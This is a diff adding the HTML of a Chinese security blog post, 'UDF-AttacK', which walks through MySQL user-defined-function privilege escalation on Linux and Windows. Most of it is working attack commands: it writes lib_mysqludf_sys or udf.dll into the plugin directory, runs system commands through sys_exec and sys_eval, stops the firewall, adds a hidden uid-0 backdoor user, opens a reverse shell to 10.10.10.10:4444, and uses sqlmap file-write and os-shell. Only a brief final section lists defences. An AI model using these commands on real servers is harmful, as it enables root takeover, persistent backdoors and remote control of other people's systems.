@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>UDF-AttacK - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="本文主要围绕linux-udf提权,windows提权百度一大波,自行度娘 0x00 基础知识利用条件 基本了解 lib_mysqludf_sys：具有与" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/udf-attack/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="UDF-AttacK" />
+<meta property="og:description" content="本文主要围绕linux-udf提权,windows提权百度一大波,自行度娘 0x00 基础知识利用条件 基本了解 lib_mysqludf_sys：具有与" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/udf-attack/" />
+<meta property="article:published_time" content="2017-10-02T21:03:07&#43;00:00"/>
+<meta property="article:modified_time" content="2017-10-02T21:03:07&#43;00:00"/>
+
+<meta itemprop="name" content="UDF-AttacK">
+<meta itemprop="description" content="本文主要围绕linux-udf提权,windows提权百度一大波,自行度娘 0x00 基础知识利用条件 基本了解 lib_mysqludf_sys：具有与">
+
+
+<meta itemprop="datePublished" content="2017-10-02T21:03:07&#43;00:00" />
+<meta itemprop="dateModified" content="2017-10-02T21:03:07&#43;00:00" />
+<meta itemprop="wordCount" content="2404">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="UDF-AttacK"/>
+<meta name="twitter:description" content="本文主要围绕linux-udf提权,windows提权百度一大波,自行度娘 0x00 基础知识利用条件 基本了解 lib_mysqludf_sys：具有与"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">UDF-AttacK</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-基础知识利用条件">0x00 基础知识利用条件</a>
+<ul>
+<li><a href="#基本了解">基本了解</a></li>
+<li><a href="#windows">windows</a></li>
+<li><a href="#linux">linux</a></li>
+</ul></li>
+<li><a href="#0x01-有可用的-so文件情况下-直接导入导出">0x01 有可用的.so文件情况下,直接导入导出</a></li>
+<li><a href="#0x02-上传到服务器-反弹shell并重新编译">0x02 上传到服务器,反弹shell并重新编译</a>
+<ul>
+<li><a href="#上传c文件到tmp目录下-使用gcc编译程序至plugin目录">上传c文件到tmp目录下,使用gcc编译程序至plugin目录</a></li>
+<li><a href="#删除之前并创建函数">删除之前并创建函数</a></li>
+<li><a href="#执行命令">执行命令</a></li>
+</ul></li>
+<li><a href="#0x03-出现的问题">0x03 出现的问题</a>
+<ul>
+<li><a href="#编译">编译</a></li>
+<li><a href="#在mysql执行命令返回为null时-也有可能udf库没有系统环境变量">在mysql执行命令返回为null时,也有可能udf库没有系统环境变量</a></li>
+<li><a href="#skip-grant-tables">skip-grant-tables</a></li>
+<li><a href="#function-sys-eval-already-exists">Function <strong>sys_eval</strong> already exists</a></li>
+</ul></li>
+<li><a href="#0x04-sqlmap-udf-getshell">0x04 sqlmap-udf-getshell</a>
+<ul>
+<li><a href="#存在注入点的情况下">存在注入点的情况下</a></li>
+<li><a href="#存在外联的情况下">存在外联的情况下</a></li>
+</ul></li>
+<li><a href="#0x05-udf提权总结与防范">0x05 UDF提权总结与防范</a>
+<ul>
+<li><a href="#有webshell的提权">有webshell的提权</a></li>
+<li><a href="#无webshell的提权">无webshell的提权</a></li>
+<li><a href="#使用-python-fuckmysql工具进行自动提权-https-github-com-v5est0r-python-fuckmysql">使用<a href="https://github.com/v5est0r/Python_FuckMySQL">Python_FuckMySQL工具进行自动提权</a></a></li>
+</ul></li>
+<li><a href="#0x06-安全防范方法">0x06 安全防范方法</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>本文主要围绕linux-udf提权,windows提权百度一大波,自行度娘</p>
+
+<h1 id="0x00-基础知识利用条件">0x00 基础知识利用条件</h1>
+
+<h2 id="基本了解">基本了解</h2>
+
+<p><code>lib_mysqludf_sys</code>：具有与操作系统交互的功能的UDF库。这些函数允许您与MySQL运行的执行环境进行交互<br />
+<code>User-Defined Functions</code> 是 Roland Bouman 开发的一个新的调用系统命令的udf包，其中有三个函数：<br />
+<code>sys_exec</code>: 调用系统命令，执行外部程序<br />
+<code>sys_get</code>: 返回系统环境变量的值<br />
+<code>sys_set</code>: 设置系统环境变量<br />
+          以上执行系统命令后返回是命令的exit_code ，而不是命令的执行结果。<br />
+<code>sys_eval</code>: 官方增加了函数，这一函数命令执行成功返回执行结果，而如果错误返回NULL。</p>
+
+<h2 id="windows">windows</h2>
+
+<p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。没有该文件夹新建即可<br />
+Mysql版本小于5.1版本。Windows2003放到c:\windows\system32<br />
+一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。<br />
+可以将udf.dll写入到相应目录的权限。</p>
+
+<p>创建目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">select @@basedir;
+select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;
+select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;</pre></td></tr></table>
+</div>
+</div>
+<p>创建cmdshell函数,该函数叫什么名字在后续中则使用该函数进行查询</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">create function cmdshell returns string soname &#39;lib_mysqludf_sys.dll&#39;;
+select sys_eval(&#39;whoami&#39;);
+select sys_eval(&#39;net stop policyagent&#39;);
+select sys_eval(&#39;net stop sharedaccess&#39;);    //停用防火墙和ip筛选
+drop function cmdshell;                      //将函数删除 ,切记切记</pre></td></tr></table>
+</div>
+</div>
+<p>udf.dll下常见函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cmdshell        执行cmd
+downloader      下载者,到网上下载指定文件并保存到指定目录
+open3389        通用开3389终端服务,可指定端口(不改端口无需重启)
+backshell       反弹Shell
+ProcessView     枚举系统进程
+KillProcess     终止指定进程
+regread         读注册表
+regwrite        写注册表
+shut            关机,注销,重启
+about           说明与帮助函数</pre></td></tr></table>
+</div>
+</div>
+<h2 id="linux">linux</h2>
+
+<p><code>mysql-plugin</code>目录具有写入权限,并且获取路径<br />
+启动mysql的权限为root<br />
+获取到root账户口令[可以到user.MYD文件获取]<br />
+低版本mysql或者没有设置<code>skip‑grant‑tables</code></p>
+
+<p>注意点:<br />
+<code>INTO OUTFILE</code>不会覆盖文件<br />
+<code>INTO OUTFILE</code>必须是查询语句的最后一句<br />
+路径名是不能编码的，必须使用单引号<br />
+函数是需要绝对路径<br />
+<code>secure_file_priv</code>全局系统变量为空,那么直接可以使用函数,如果为null是不能使用,该变量用于限制数据的导入和导出操作，例如<code>SELECT … INTO OUTFILE</code>语句和<code>LOAD_FILE()</code><br />
+mysql的<code>5.5.53</code>之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</p>
+
+<p><code>INTO OUTFILE/DUMPFILE</code> 这两个函数都可以写文件，但是有很大的差别<br />
+<code>INTO OUTFILE</code>函数写文件时会在每一行的结束自动加上换行符<br />
+<code>INTO DUMPFILE</code>函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择<br />
+当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的</p>
+
+<h1 id="0x01-有可用的-so文件情况下-直接导入导出">0x01 有可用的.so文件情况下,直接导入导出</h1>
+
+<p><code>uname -a</code> 确定系统x86 x64</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[mysqld]
+port        = 3306
+secure_file_priv =</pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">show</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">&#39;%plugin%&#39;</span><span class="p">;</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">func</span><span class="p">;</span>
+<span class="k">select</span> <span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/xx/lib_mysqludf_sys.so&#39;</span><span class="p">))</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">&#39;/tmp/udf.txt&#39;</span><span class="p">;</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">udf</span><span class="p">.</span><span class="n">txt</span>
+<span class="k">select</span> <span class="n">unhex</span><span class="p">(</span><span class="s1">&#39;7F454[udf内容]xx...&#39;</span><span class="p">)</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;/usr/local/mysql/lib/plugin/mysqludf.so&#39;</span><span class="p">;</span></code></pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x02-上传到服务器-反弹shell并重新编译">0x02 上传到服务器,反弹shell并重新编译</h1>
+
+<h2 id="上传c文件到tmp目录下-使用gcc编译程序至plugin目录">上传c文件到tmp目录下,使用gcc编译程序至plugin目录</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-gcc" data-lang="gcc"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-gcc" data-lang="gcc">gcc -Wall -I/usr/local/mysql/include/ -Os -shared lib_mysqludf_sys.c -fPIC -o /usr/local/mysql/lib/plugin/lib_mysqludf_sys.so</code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="删除之前并创建函数">删除之前并创建函数</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">lib_mysqludf_sys_so</span><span class="p">;</span>
+<span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">sys_get</span><span class="p">;</span>
+<span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">sys_set</span><span class="p">;</span>
+<span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">sys_exec</span><span class="p">;</span>
+<span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">sys_eval</span><span class="p">;</span>
+
+<span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">lib_mysqludf_sys_info</span> <span class="k">RETURNS</span> <span class="n">string</span> <span class="n">SONAME</span> <span class="s1">&#39;lib_mysqludf_sys.so&#39;</span><span class="p">;</span>
+<span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">sys_get</span> <span class="k">RETURNS</span> <span class="n">string</span> <span class="n">SONAME</span> <span class="s1">&#39;lib_mysqludf_sys.so&#39;</span><span class="p">;</span>
+<span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">sys_set</span> <span class="k">RETURNS</span> <span class="nb">int</span> <span class="n">SONAME</span> <span class="s1">&#39;lib_mysqludf_sys.so&#39;</span><span class="p">;</span>
+<span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">sys_exec</span> <span class="k">RETURNS</span> <span class="nb">int</span> <span class="n">SONAME</span> <span class="s1">&#39;lib_mysqludf_sys.so&#39;</span><span class="p">;</span>
+<span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">sys_eval</span> <span class="k">RETURNS</span> <span class="n">string</span> <span class="n">SONAME</span> <span class="s1">&#39;lib_mysqludf_sys.so&#39;</span><span class="p">;</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="执行命令">执行命令</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
+<span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
+<span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;ifconfig&#39;</span><span class="p">);</span>
+<span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;useradd -u 0 -o -g root -G root -p `openssl passwd -1 -salt &#39;</span><span class="mi">123</span><span class="s1">&#39; evilfox123` evilfox&#39;</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x03-出现的问题">0x03 出现的问题</h1>
+
+<h2 id="编译">编译</h2>
+
+<p>当编译时出现类似报错时,将<code>-I/usr/local/mysql/include/</code>替换成<code>my_globel.h</code>的主目录<br />
+<code>lib_mysqludf_sys.c:40:23: fatal error: my_global.h: No such file or directory#include &lt;my_global.h&gt;</code></p>
+
+<h2 id="在mysql执行命令返回为null时-也有可能udf库没有系统环境变量">在mysql执行命令返回为null时,也有可能udf库没有系统环境变量</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">sudo chown mysql:mysql /home/cassiano/teste/ -R</pre></td></tr></table>
+</div>
+</div>
+<h2 id="skip-grant-tables">skip-grant-tables</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Can&#39;t initialize function &#39;backshell&#39;; UDFs are unavailable with the --skip-grant-tables option</pre></td></tr></table>
+</div>
+</div>
+<p>需要将my.ini中的skip-grant-tables选项去掉。</p>
+
+<h2 id="function-sys-eval-already-exists">Function <strong>sys_eval</strong> already exists</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">lib_mysqludf_sys_so</span><span class="p">;</span>
+<span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">sys_get</span><span class="p">;</span>
+<span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">sys_set</span><span class="p">;</span>
+<span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">sys_exec</span><span class="p">;</span>
+<span class="k">DROP</span> <span class="k">FUNCTION</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">sys_eval</span><span class="p">;</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">plugin</span><span class="p">;</span>
+<span class="k">delete</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">plugin</span><span class="p">;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>重启mysql服务即可</p>
+
+<h1 id="0x04-sqlmap-udf-getshell">0x04 sqlmap-udf-getshell</h1>
+
+<h2 id="存在注入点的情况下">存在注入点的情况下</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">找到MySQL插件目录,然后利用sqlmap上传 lib_mysqludf_sys到MySQL插件目录,激活存储过程sys_exec函数
+python sqlmap.py -u &#39;http://xxxx&#39; --sql-shell
+    show variables like &#34;%plugin%&#34;;
+
+python sqlmap.py -u &#39;http://xxxx&#39; --file-write=/lib_mysqludf_sys.so
+--file-dest=/usr/lib/mysql/plugin/
+
+python sqlmap.py -u &#39;http://xxxx&#39; --sql-shell
+    CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+    SELECT * FROM information_schema.routines
+    sys_exec(id);</pre></td></tr></table>
+</div>
+</div>
+<h2 id="存在外联的情况下">存在外联的情况下</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">sqlmap -d &#34;mysql://root:root@10.10.10.10:3306/mysql&#34; --os-shell</pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">语法 DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME 或者是DBMS://DATABASE_FILEPATH。
+[1]dbms:代表所使用的数据库，如我们这里是mysql
+[2]user:对应我们数据库的用户，如我们这里是root
+[3]password:对应我们数据的密码，如我的服务器为root
+[4]dbma_IP:数据库服务器对应的ip地址，如我这里为10.10.10.10
+[5]dbms_PORT:数据服务器所使用的端口
+[6]database_NAME:你要使用的数据库名</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x05-udf提权总结与防范">0x05 UDF提权总结与防范</h1>
+
+<h2 id="有webshell的提权">有webshell的提权</h2>
+
+<p>不多说,直接上udf马儿</p>
+
+<h2 id="无webshell的提权">无webshell的提权</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">select version(); //获取mysql版本
+select @@basedir; //查找到mysql的目录
+SHOW VARIABLES LIKE &#39;%plugin%&#39; //查看高版本插件位置</pre></td></tr></table>
+</div>
+</div>
+<p>通过查询将udf.dll转成代码插入数据库，然后导出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">use</span> <span class="n">mysql</span><span class="p">;</span>
+<span class="k">set</span> <span class="o">@</span><span class="n">a</span><span class="o">=</span><span class="n">concat</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="mi">0</span><span class="n">x代码</span><span class="p">);</span>
+<span class="k">create</span> <span class="k">table</span> <span class="n">Ghost</span><span class="p">(</span><span class="k">data</span> <span class="n">LONGBLOB</span><span class="p">);</span>
+<span class="k">insert</span> <span class="k">into</span> <span class="n">Ghost</span> <span class="k">values</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span><span class="k">update</span> <span class="n">Ghost</span> <span class="k">set</span> <span class="k">data</span> <span class="o">=</span> <span class="o">@</span><span class="n">a</span><span class="p">;</span>
+<span class="err">代码为</span><span class="k">select</span> <span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;c:/udf.dll&#39;</span><span class="p">))</span><span class="err">中的内容</span>
+<span class="k">select</span> <span class="k">data</span> <span class="k">from</span> <span class="n">Ghost</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;c:/phpStudy/MySQL/lib/plugin/udf.dll&#39;</span><span class="p">;</span> <span class="o">//</span><span class="err">导出</span><span class="n">ufd</span><span class="p">.</span><span class="n">dll</span>
+<span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">backshell</span> <span class="k">RETURNS</span> <span class="n">STRING</span> <span class="n">SONAME</span> <span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span><span class="o">//</span><span class="err">创建函数</span>
+<span class="k">select</span> <span class="n">backshell</span><span class="p">(</span><span class="s2">&#34;10.10.10.10&#34;</span><span class="p">,</span><span class="mi">4444</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="使用-python-fuckmysql工具进行自动提权-https-github-com-v5est0r-python-fuckmysql">使用<a href="https://github.com/v5est0r/Python_FuckMySQL">Python_FuckMySQL工具进行自动提权</a></h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">python root.py -a 127.0.0.1 -p root -e &#34;ver&amp;whoami&#34; -m udf
+python root.py -a 127.0.0.1 -p root -e &#34;ver&amp;whoami&#34; -m lpk
+python root.py -a 127.0.0.1 -p root -e &#34;ver&amp;whoami&#34; –m st</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x06-安全防范方法">0x06 安全防范方法</h1>
+
+<p>尽量避免提供对外链接，通过mysql中的user表进行查看，禁用&rdquo;%&ldquo;。<br />
+设置复杂的Root账号密码。<br />
+对my.ini设置只读属性，设置plugin目录为只读目录。</p>
+
+<p><a href="http://www.secange.com/2017/07/%E7%AA%81%E7%A0%B4%E5%BB%B6%E8%BF%9F%E6%B3%A8%E5%85%A5%E5%92%8C%E7%9B%B2%E6%B3%A8%E9%80%9F%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C%E5%88%A9%E7%94%A8dns%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E8%8E%B7/">突破延迟注入和盲注速度限制，利用dns注入快速获取数据</a></p>
+
+<p><a href="https://github.com/v5est0r/Python_FuckMySQL">https://github.com/v5est0r/Python_FuckMySQL</a></p>
+
+<p><a href="https://github.com/sqlmapproject/udfhack">https://github.com/sqlmapproject/udfhack</a></p>
+
+<p><a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></p>
+
+<p><a href="https://github.com/mysqludf/lib_mysqludf_sys/issues/4">https://github.com/mysqludf/lib_mysqludf_sys/issues/4</a></p>
+
+<p><a href="http://www.freebuf.com/articles/web/30841.html">http://www.freebuf.com/articles/web/30841.html</a></p>
+
+<p><a href="https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html">https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html</a></p>
+
+<p><a href="http://zhuanlan.51cto.com/art/201702/531259.htm">http://zhuanlan.51cto.com/art/201702/531259.htm</a></p>
+
+<p><a href="http://zhuanlan.51cto.com/art/201702/532984.htm">http://zhuanlan.51cto.com/art/201702/532984.htm</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/%E8%AF%91-15-way-bypass-powershell-exec/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">[译] 15-ways-bypass-powershell-exec</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/dll-attack/">
+            <span class="next-text nav-default">DLL-Attack</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
